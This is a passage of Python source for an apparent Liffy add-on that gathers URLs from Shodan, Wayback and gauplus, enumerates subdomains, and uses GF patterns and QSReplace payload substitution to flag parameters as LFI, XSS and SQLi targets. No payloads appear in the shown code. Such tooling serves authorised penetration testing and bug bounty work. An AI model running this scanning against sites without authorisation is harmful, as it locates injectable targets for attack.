        """Discover subdomains using gauplus and wayback"""
        self.logger.info(f"Starting subdomain discovery for: {domain}")
        
        # Discover subdomains using gauplus
        subdomains = self.gauplus_gatherer.discover_subdomains(domain, limit=limit)
        
        # Also try wayback-specific discovery
        wayback_urls = self.gauplus_gatherer.gather_wayback_urls(domain, subs=True, limit=limit)
        wayback_subdomains = set()
        for url_info in wayback_urls:
            wayback_subdomains.add(url_info.domain)
        
        # Combine and deduplicate
        all_subdomains = set(subdomains) | wayback_subdomains
        final_subdomains = list(all_subdomains)[:limit]
        
        self.logger.info(f"Discovered {len(final_subdomains)} unique subdomains for {domain}")
        return final_subdomains
    
    def discover_parameters_with_gf(self, urls: List[str], pattern_type: str = "lfi") -> List[URLInfo]:
        """Discover parameters using GF patterns"""
        self.logger.info(f"Discovering parameters using GF pattern: {pattern_type}")
        
        # Convert URLs to list if single URL
        if isinstance(urls, str):
            urls = [urls]
        
        discovered_urls = self.gf_matcher.discover_parameters(urls, pattern_type)
        
        self.logger.info(f"Found {len(discovered_urls)} URLs with {pattern_type} parameters")
        return discovered_urls
    
    def test_with_qsreplace(self, urls: List[URLInfo], vuln_type: str = "lfi") -> List[URLInfo]:
        """Test URLs with QSReplace and payload lists"""
        self.logger.info(f"Testing {len(urls)} URLs with QSReplace for {vuln_type}")
        
        all_tested_urls = []
        
        for url_info in urls:
            tested_urls = self.qsreplace_tester.test_url_with_payloads(url_info, vuln_type)
            all_tested_urls.extend(tested_urls)
        
        self.logger.info(f"Generated {len(all_tested_urls)} test URLs with QSReplace")
        return all_tested_urls
    
    def comprehensive_discovery(self, domain: str = None, shodan_query: str = None,
                              limit: int = 100, subs: bool = True, 
                              use_gf_patterns: bool = True, use_qsreplace: bool = True,
                              gf_patterns: List[str] = None) -> List[URLInfo]:
        """Comprehensive target discovery with all methods"""
        all_urls = []
        
        # Start with basic URL gathering
        basic_urls = self.gather_all_urls(
            domain=domain,
            shodan_query=shodan_query,
            limit=limit,
            subs=subs
        )
        all_urls.extend(basic_urls)
        
        # If domain provided, discover subdomains
        if domain:
            subdomains = self.discover_subdomains(domain, limit=limit//2)
            for subdomain in subdomains:
                subdomain_urls = self.gauplus_gatherer.gather_urls(subdomain, subs=False, limit=50)
                all_urls.extend(subdomain_urls)
        
        # Remove duplicates
        unique_urls = self._remove_duplicates(all_urls)
        
        # Use GF patterns for parameter discovery
        if use_gf_patterns and unique_urls:
            self.logger.info("Running GF pattern discovery...")
            
            # Default patterns if none specified
            if not gf_patterns:
                gf_patterns = ['lfi', 'xss', 'sqli', 'ssti', 'rce']
            
            for pattern in gf_patterns:
                try:
                    pattern_urls = self.discover_parameters_with_gf([u.url for u in unique_urls], pattern)
                    unique_urls.extend(pattern_urls)
                except Exception as e:
                    self.logger.error(f"Error with GF pattern {pattern}: {str(e)}")
        
        # Use QSReplace for comprehensive testing
        if use_qsreplace and unique_urls:
            self.logger.info("Running QSReplace testing...")
            
            # Test for different vulnerability types
            for vuln_type in ['lfi', 'xss', 'sqli']:
                try:
                    tested_urls = self.test_with_qsreplace(unique_urls, vuln_type)
                    unique_urls.extend(tested_urls)
                except Exception as e:
                    self.logger.error(f"Error with QSReplace {vuln_type}: {str(e)}")
        
        # Final deduplication
        final_urls = self._remove_duplicates(unique_urls)
        
        self.logger.info(f"Comprehensive discovery complete: {len(final_urls)} unique URLs found")
        return final_urls
    
    def get_available_gf_patterns(self) -> List[str]:
        """Get available GF patterns"""
        return self.gf_matcher.get_available_patterns()
    
    def test_parameter_injection(self, url_info: URLInfo, pattern_type: str = "lfi") -> bool:
        """Test specific URL for parameter injection"""
        return self.gf_matcher.test_parameter_injection(url_info, pattern_type)

def main():
    """Main function for testing"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Enhanced URL Gathering Tool for Liffy with Subdomain Enumeration and Pattern Discovery")
    parser.add_argument("--domain", help="Target domain for historical URL gathering")
    parser.add_argument("--shodan-query", help="Shodan query for target discovery")
    parser.add_argument("--random", action="store_true", help="Use random targets from ~/targets/scope")
    parser.add_argument("--random-count", type=int, default=5, help="Number of random targets to select")
    parser.add_argument("--limit", type=int, default=100, help="Limit number of results")
    parser.add_argument("--country", help="Filter by country code")
    parser.add_argument("--asn", help="Filter by ASN")
    parser.add_argument("--ports", help="Target specific ports")
    parser.add_argument("--output", help="Output file for results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    # New arguments for enhanced functionality
    parser.add_argument("--subdomains", action="store_true", help="Enable subdomain enumeration")
    parser.add_argument("--gf-patterns", nargs="+", help="GF patterns to use (lfi, xss, sqli, ssti, rce)")
    parser.add_argument("--qsreplace", action="store_true", help="Enable QSReplace testing")
    parser.add_argument("--comprehensive", action="store_true", help="Run comprehensive discovery with all methods")
    parser.add_argument("--list-gf-patterns", action="store_true", help="List available GF patterns")
    
    args = parser.parse_args()
    
    # Setup logging
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    logger = logging.getLogger(__name__)
    
    # Create gatherer
    gatherer = URLGatherer(logger)
    
    # List GF patterns if requested
    if args.list_gf_patterns:
        patterns = gatherer.get_available_gf_patterns()
        print(f"\n{t.green('Available GF Patterns:')}")
        for pattern in patterns:
            print(f"  {pattern}")
        return
    
    # Run comprehensive discovery if requested
    if args.comprehensive:
        urls = gatherer.comprehensive_discovery(
            domain=args.domain,
            shodan_query=args.shodan_query,
            limit=args.limit,
            subs=args.subdomains,
            use_gf_patterns=bool(args.gf_patterns),
            use_qsreplace=args.qsreplace,
            gf_patterns=args.gf_patterns
        )
    else:
        # Standard URL gathering
        urls = gatherer.gather_all_urls(
            domain=args.domain,
            shodan_query=args.shodan_query,
            limit=args.limit,
            country=args.country,
            asn=args.asn,
            ports=args.ports,
            random_targets=args.random,
            random_count=args.random_count
        )
        
        # Add subdomain discovery if requested
        if args.subdomains and args.domain:
            subdomains = gatherer.discover_subdomains(args.domain, limit=args.limit//2)
            for subdomain in subdomains:
                subdomain_urls = gatherer.gauplus_gatherer.gather_urls(subdomain, subs=False, limit=50)
                urls.extend(subdomain_urls)
        
        # Add GF pattern discovery if requested
        if args.gf_patterns and urls:
            for pattern in args.gf_patterns:
                pattern_urls = gatherer.discover_parameters_with_gf([u.url for u in urls], pattern)
                urls.extend(pattern_urls)
        
        # Add QSReplace testing if requested
        if args.qsreplace and urls:
            for vuln_type in ['lfi', 'xss', 'sqli']:
                tested_urls = gatherer.test_with_qsreplace(urls, vuln_type)
                urls.extend(tested_urls)
    
    if urls:
        # Remove duplicates
        unique_urls = gatherer._remove_duplicates(urls)
        
        # Analyze URLs
        analyzed_urls = gatherer.analyze_urls(unique_urls)
        
        # Test vulnerabilities
        tested_urls = gatherer.test_vulnerabilities(analyzed_urls)
        
        # Save results
        gatherer.save_results(tested_urls, args.output)
        
        # Show summary
        lfi_targets = gatherer.get_lfi_targets(tested_urls)
        xss_targets = gatherer.get_xss_targets(tested_urls)
        sqli_targets = gatherer.get_sqli_targets(tested_urls)
        
        print(f"\n{t.green('Summary:')}")
        print(f"Total URLs: {len(tested_urls)}")
        print(f"LFI targets: {len(lfi_targets)}")
        print(f"XSS targets: {len(xss_targets)}")
        print(f"SQLi targets: {len(sqli_targets)}")
        
        if lfi_targets:
            print(f"\n{t.yellow('LFI Targets:')}")
            for target in lfi_targets[:5]:  # Show first 5
                print(f"  {target.url}")
        
        if xss_targets:
            print(f"\n{t.yellow('XSS Targets:')}")
            for target in xss_targets[:5]:  # Show first 5
                print(f"  {target.url}")
        
        if sqli_targets:
            print(f"\n{t.yellow('SQLi Targets:')}")
            for target in sqli_targets[:5]:  # Show first 5
                print(f"  {target.url}")
    
    else:
        print("No URLs found")

if __name__ == "__main__":
    main()